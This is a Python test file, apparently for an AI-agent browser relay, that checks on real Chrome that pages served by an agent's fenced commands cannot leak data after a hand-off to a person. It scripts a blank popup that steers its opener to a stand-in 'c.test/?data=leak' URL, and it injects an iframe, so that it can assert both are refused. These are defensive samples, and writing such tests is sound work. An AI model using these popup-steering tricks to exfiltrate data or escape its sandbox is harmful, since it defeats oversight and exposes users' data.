# Copyright (c) 2026-present Plane Software, Inc. and contributors
# SPDX-License-Identifier: AGPL-3.0-only
# See the LICENSE file for details.

"""What a fenced command writes never leaves through a hand-off (ADR-078 decision 21), on the real
Chrome: a page that held such a document marks every page it opened, however it looks afterwards.
Sites and the helper fixture are `tests/support/rigs/chrome_rig.py`; the rules, on a scripted Chrome,
`tests/unit/device/test_cdp_relay_written.py`."""

from __future__ import annotations

import json

from prismoid.ai.frames.cdp_ws import WsCdp
from tests.support.markers import darwin_only, needs_chrome
from tests.support.rigs.chrome_rig import (
    Helper,
    chrome_page,
    hand_over,
    person_goes,
    real_click,
    serve_own_page,
    stop_own_page,
    until,
)
from tests.support.rigs.chrome_rig import helper as helper


def _tops(helper: Helper, ref: str) -> dict[str, str]:
    return helper.chrome.tops_of(ref)


async def _on_own_page(helper: Helper, ref: str, tag: str) -> tuple[WsCdp, str, str, str]:
    """The agent opened a page a fenced command serves: (its connection, its session, the tab, how to
    stop the server)."""
    own, stop = await serve_own_page(helper, ref, tag)
    cdp = await helper.dial(ref)
    target, session = await chrome_page(cdp)
    await cdp.call("Page.navigate", {"url": f"http://127.0.0.1:{own}/own.html"}, session_id=session)
    await until(lambda: _tops(helper, ref), "its commit")
    return cdp, session, target, stop


async def _opens_blank_popup_that_steers(
    cdp: WsCdp, session: str, helper: Helper, ref: str, url: str
) -> None:
    """With the click the agent made, the page opens a blank popup, writes into it, and leaves. Its
    `about:blank` shows nothing a URL could tell, its script runs on, and it will steer its opener."""
    script = f"setTimeout(() => {{ opener.location = {url!r} }}, 2000); 0"
    opens = f"window.open('about:blank').eval({json.dumps(script)})"
    await cdp.call("Runtime.evaluate", {"expression": opens, "userGesture": True}, session_id=session)
    await until(lambda: len(helper.chrome.pages_of_task(ref)) == 2, "the popup")


async def _leaves_for_a_listed_site(cdp: WsCdp, session: str, helper: Helper, ref: str) -> None:
    """By its own script, as a page does: Chrome keeps the popup's window reference then."""
    url = f"http://a.test:{helper.site.port}/link-first"
    await cdp.call("Runtime.evaluate", {"expression": f"location = {url!r}; 0"}, session_id=session)
    await until(lambda: "a.test" in str(_tops(helper, ref)), "the listed page")
    await cdp.call("Page.bringToFront", session_id=session)


@darwin_only
@needs_chrome
async def test_a_blank_popup_a_commands_page_wrote_takes_no_data_off_the_list(helper: Helper) -> None:
    """Nothing in the task shows a command's URL by the hand-off, and the popup's script steers the
    tab that is handed: the road out of the fence, with no person in it."""
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    cdp, session, _, stop = await _on_own_page(helper, ref, "blank")
    try:
        await _opens_blank_popup_that_steers(cdp, session, helper, ref, f"http://c.test:{port}/?data=leak")
        await _leaves_for_a_listed_site(cdp, session, helper, ref)
        await cdp.close()
        await hand_over(helper, ref)
        assert not helper.chrome.handed(ref), "nothing is handed while that popup is open"
        await until(
            lambda: any(d["host"] == "c.test" for d in helper.chrome_denials(ref)), "the steer, refused"
        )
        assert not any(host == "c.test" for host, _ in helper.site.hits)
    finally:
        await stop_own_page(helper, ref, stop)


@darwin_only
@needs_chrome
async def test_with_that_popup_closed_a_hand_off_works_again(helper: Helper) -> None:
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    cdp, session, tab, stop = await _on_own_page(helper, ref, "closed")
    try:
        await _opens_blank_popup_that_steers(cdp, session, helper, ref, "about:blank")
        await _leaves_for_a_listed_site(cdp, session, helper, ref)
        popup = next(page for page in helper.chrome.pages_of_task(ref) if page != tab)
        await cdp.call("Target.closeTarget", {"targetId": popup})
        await until(lambda: len(helper.chrome.pages_of_task(ref)) == 1, "the popup, gone")
        await cdp.close()
        await hand_over(helper, ref)
        assert helper.chrome.handed(ref) == {tab}
        await person_goes(helper, ref, f"http://c.test:{port}/signed-in")
        await until(lambda: helper.site.saw("c.test", "/signed-in"), "the sign-in")
    finally:
        await stop_own_page(helper, ref, stop)


@darwin_only
@needs_chrome
async def test_a_tab_that_left_a_commands_page_and_opened_nothing_is_still_handed(helper: Helper) -> None:
    """A coding task looks at its own server, and then the person signs in on the same tab."""
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    cdp, session, tab, stop = await _on_own_page(helper, ref, "left")
    try:
        await cdp.call("Page.navigate", {"url": f"http://a.test:{port}/link-first"}, session_id=session)
        await until(lambda: "a.test" in str(_tops(helper, ref)), "the listed page")
        await cdp.close()
        await hand_over(helper, ref)
        assert helper.chrome.handed(ref) == {tab}
    finally:
        await stop_own_page(helper, ref, stop)


@darwin_only
@needs_chrome
async def test_a_tab_the_agent_opens_from_such_a_page_holds_no_reference_and_marks_nothing(
    helper: Helper,
) -> None:
    """The relay opens it `noopener`, from the task's first page, whatever that once held."""
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    cdp, session, tab, stop = await _on_own_page(helper, ref, "tab")
    try:
        await cdp.call("Page.navigate", {"url": f"http://a.test:{port}/link-first"}, session_id=session)
        await until(lambda: "a.test" in str(_tops(helper, ref)), "the listed page")
        made = await cdp.call("Target.createTarget", {"url": f"http://a.test:{port}/link-second"})
        await until(lambda: "/link-second" in str(_tops(helper, ref)), "the new tab")
        await cdp.close()
        await hand_over(helper, ref)
        assert helper.chrome.handed(ref) == {tab, made["targetId"]}
    finally:
        await stop_own_page(helper, ref, stop)


@darwin_only
@needs_chrome
async def test_a_frame_of_a_commands_page_landing_in_a_pass_ends_it(helper: Helper) -> None:
    port = helper.site.port
    ref = await helper.frame("ta", "a.test")
    own, stop = await serve_own_page(helper, ref, "frame")
    cdp = await helper.dial(ref)
    try:
        _, session = await chrome_page(cdp)
        await cdp.call("Page.navigate", {"url": f"http://a.test:{port}/link-first"}, session_id=session)
        await until(lambda: "a.test" in str(_tops(helper, ref)), "the listed page")
        await cdp.close()
        await hand_over(helper, ref)
        chrome = helper.chrome
        assert chrome.handed(ref)
        page = chrome.pages_of_task(ref)[0]
        framed = (
            f"document.body.append(Object.assign(document.createElement('iframe'), "
            f"{{src: 'http://127.0.0.1:{own}/own.html'}})); 0"
        )
        await chrome.call("Runtime.evaluate", {"expression": framed}, session=chrome.fence_session(page))
        await until(lambda: not chrome.handed(ref), "the pass, over")
    finally:
        await stop_own_page(helper, ref, stop)


@darwin_only
@needs_chrome
async def test_a_persons_own_click_goes_where_it_leads_in_a_pass_and_nowhere_outside_one(
    helper: Helper,
) -> None:
    """Real input, not a page's script: `tests/support/rigs/chrome_rig.person_goes` stands in for this everywhere
    else, and the pass, which cannot tell them apart, treats them the same."""
    ref = await helper.frame("ta", "a.test")
    cdp = await helper.dial(ref)
    _, session = await chrome_page(cdp)
    port = helper.site.port
    await cdp.call("Page.navigate", {"url": f"http://a.test:{port}/link-before"}, session_id=session)
    await until(lambda: "/link-before" in str(_tops(helper, ref)), "the listed page")
    await cdp.close()
    await real_click(helper, ref, "/link-before")
    await until(lambda: any(d["host"] == "b.test" for d in helper.chrome_denials(ref)), "refused")
    assert not helper.site.saw("b.test", "/clicked-before")

    cdp = await helper.dial(ref)
    _, session = await chrome_page(cdp)
    await cdp.call("Page.navigate", {"url": f"http://a.test:{port}/link-during"}, session_id=session)
    await until(lambda: "/link-during" in str(_tops(helper, ref)), "the listed page again")
    await cdp.close()
    await hand_over(helper, ref)
    await real_click(helper, ref, "/link-during")
    await until(lambda: helper.site.saw("b.test", "/clicked-during"), "the person's click")
